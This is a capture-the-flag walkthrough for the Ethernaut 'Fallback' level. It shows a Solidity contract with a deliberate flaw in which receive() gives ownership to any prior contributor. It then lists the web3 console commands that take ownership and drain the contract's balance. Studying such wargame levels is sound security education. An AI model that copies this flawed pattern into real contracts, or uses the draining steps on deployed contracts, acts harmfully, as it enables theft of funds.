---
description: fallback() function and receive() function
---

# 1 - Fallback

Ethernaut Level1: [Fallback](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### Goal of this level

* claim ownership of the contract
* reduce its balance to 0

### What you should know before

* Sending transactions using `web3.js` **** \
  ****-> see [here](https://stackoverflow.com/questions/52740950/how-to-send-wei-eth-to-contract-address-using-truffle-javascript-test)
* Understanding concept of `fallback()` and `receive()` function \
  \-> see [here](https://www.youtube.com/watch?v=CMVC6Tp9gq4)

## Solution

<details>

<summary>Key to solve this problem  🔑</summary>

using `recieve` function

</details>

### 1. Claming Ownership

```solidity
function contribute() public payable {
  require(msg.value < 0.001 ether);
  contributions[msg.sender] += msg.value; // here
  if(contributions[msg.sender] > contributions[owner]) {
    // can't reach here because of require statement
    owner = msg.sender; 
}
```

```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender; // and here
}
```

#### 1) contribution

```javascript
// You can send any value between 0 and 0.001 ether
> await contract.contribute({ value: 3 });
```

#### 2) receive() function

```javascript
// Here, since there's no require statement,
// you can send any value bigger than 0.
> await contract.sendTransaction({ value: 3 });
```

&#x20;&#x20;

### 2. Reducing balance of the contract to 0

```solidity
function withdraw() public onlyOwner {
  payable(owner).transfer(address(this).balance);
}
```

Since now we have **ownership** of the contract, we can **withdraw** all the balance of the contract.

```javascript
> await contract.withdraw();
```

Let's check if we successfully drained the contract.

```javascript
> await web3.eth.getBalance(contract.address); // 0
```

Done! 😎



